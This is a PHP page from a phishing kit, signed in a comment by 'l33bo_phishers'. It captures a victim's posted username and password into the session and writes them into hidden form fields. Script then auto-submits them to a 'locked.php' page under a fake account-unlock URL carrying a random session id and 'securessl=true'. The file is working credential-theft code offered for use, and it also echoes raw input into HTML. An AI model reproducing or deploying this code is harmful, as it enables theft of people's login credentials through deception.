<?
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "session_protect.php";
require "functions.php";
$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass']; 
?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>